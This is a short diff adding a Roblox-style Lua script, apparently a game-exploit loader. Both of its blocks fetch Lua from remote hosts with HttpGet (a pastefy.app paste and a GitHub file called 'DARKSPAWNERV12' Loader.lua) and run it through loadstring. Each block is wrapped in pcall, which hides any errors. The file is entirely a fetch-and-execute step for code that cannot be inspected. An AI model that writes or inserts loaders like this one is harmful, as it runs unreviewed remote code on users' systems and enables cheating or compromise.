@@ -1,0 +1,7 @@
+pcall(function()
+    loadstring(game:HttpGet("https://pastefy.app/TNmjvzLo/raw"))()
+end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/caywzzajaaaqx/DARKSPAWNERV12/refs/heads/main/Loader.lua"))()
+end)
